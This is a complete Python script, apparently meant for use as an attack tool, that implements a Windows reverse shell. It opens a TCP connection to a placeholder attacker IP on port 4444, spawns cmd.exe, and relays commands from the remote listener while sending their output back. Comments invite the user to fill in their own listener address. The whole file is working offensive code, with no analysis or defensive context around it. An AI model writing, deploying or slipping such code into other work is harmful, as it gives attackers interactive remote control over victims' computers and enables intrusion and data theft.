import socket
import subprocess
import os

# Configuration
ATTACKER_IP = "10.10.10.10"  # Replace with your listener IP
PORT = 4444                  # Replace with your listener port

def reverse_shell():
    # 1. Initialize TCP socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, PORT))
    
    # 2. Open an interactive Windows command prompt
    # Piping stdin, stdout, and stderr forces subprocess data through the handles
    process = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
        text=True
    )
    
    # 3. Continuous I/O loop between the network socket and cmd.exe
    while True:
        # Check if the command prompt process has been closed
        if process.poll() is not None:
            break
            
        # Read the command sent from the attacker machine
        command = s.recv(1024).decode('utf-8')
        if not command:
            break
        if command.strip().lower() == "exit":
            break
            
        # Write command to cmd.exe stdin and flush the buffer
        process.stdin.write(command)
        process.stdin.flush()
        
        # Capture the command output or error
        # Note: A short timeout or non-blocking read is required for long-running scripts,
        # but reading line-by-line or reading available bytes works for standard execution.
        output = process.stdout.readline()
        
        # Send the output string back through the socket
        s.send(output.encode('utf-8'))

    s.close()

if __name__ == "__main__":
    reverse_shell()
